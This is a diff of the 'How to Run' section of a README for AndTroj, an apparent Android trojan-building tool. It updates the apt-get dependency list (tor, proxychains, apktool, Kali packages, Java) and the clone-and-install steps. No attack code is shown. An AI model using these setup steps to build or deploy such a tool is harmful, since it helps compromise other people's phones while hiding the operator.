@@ -39,7 +39,7 @@ After completing the build-in program that intercepts itself, I will show you th
 
 # How to Run
 ```
-apt-get install -y tor apktool aapt sendemail proxychains python-socks kali-linux-full
+apt-get install -y tor apktool aapt proxychains python-socks zipalign kali-linux-full openjdk-10-jdk openjdk-8-jdk
 git clone https://github.com/unk9vvn/AndTroj.git
 cd AndTroj && chmod 755 atj.py requirements.txt
 pip install -r requirements.txt
